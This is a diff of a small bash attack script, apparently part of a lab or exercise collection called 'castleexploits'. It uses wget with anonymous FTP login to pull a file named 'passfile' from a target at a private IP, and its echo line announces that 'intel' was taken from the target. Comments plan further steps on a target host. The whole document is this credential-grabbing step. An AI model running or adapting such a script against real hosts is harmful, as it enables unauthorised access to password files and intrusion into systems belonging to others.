@@ -1,6 +1,8 @@
 #!/bin/bash
-wget --ftp-user=anonymous --ftp-password="" ftp://10.252.41.120/passfile
+wget -O passfile --ftp-user=anonymous --ftp-password="" ftp://10.252.41.120/passfile
 echo "Intel attained via files pulled down from target via anonymous FTP!"
 
+#Reset SNAPSHOTUPTIME counter
+#Use redhost and targethost variables to do this
 
 #Complete except for making the IP passable and delivering to /home/ncraf/castleexploits
